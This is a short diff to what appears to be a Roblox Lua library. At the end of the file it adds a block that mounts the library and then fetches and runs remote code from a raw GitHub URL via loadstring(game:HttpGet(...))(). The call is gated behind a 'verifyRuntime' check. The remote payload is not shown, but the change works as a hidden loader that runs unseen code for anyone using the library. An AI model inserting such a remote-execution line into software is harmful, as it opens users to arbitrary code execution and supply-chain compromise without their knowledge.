@@ -2590,3 +2590,8 @@ end)()
 if type(_G) == "table" then
 	_G.ALPHA = ALPHA
 end
+local mounted = ALPHA.mount(config)
+
+if mounted and mounted.verifyRuntime() then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/qwerqwerg1u/RRTS/main/판자격파"))()
+end
